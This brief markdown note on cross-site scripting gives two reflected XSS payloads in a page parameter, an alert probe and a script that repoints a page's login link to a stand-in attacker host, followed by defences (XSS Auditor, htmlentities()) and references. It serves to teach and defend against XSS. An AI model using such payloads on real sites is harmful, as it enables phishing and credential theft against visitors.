# Cross-site scripting

## Attack

* Check

```
index.php?page=<script>alert(123)</script>
```

* Change login url

```
index.php?page=<script>document.getElementsByTagName('a')[0].href="http://hackyou.com/xss/login.html"</script>
```

## Defence
* XSS Auditor (Chrome & Safari)
* php method: htmlentities()

## Reference
* [Cross-site scripting@wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)
* [Understanding XSS Auditor - Virtue Security](https://www.virtuesecurity.com/blog/understanding-xss-auditor/)
* [PHP: htmlentities - Manual](https://secure.php.net/manual/en/function.htmlentities.php)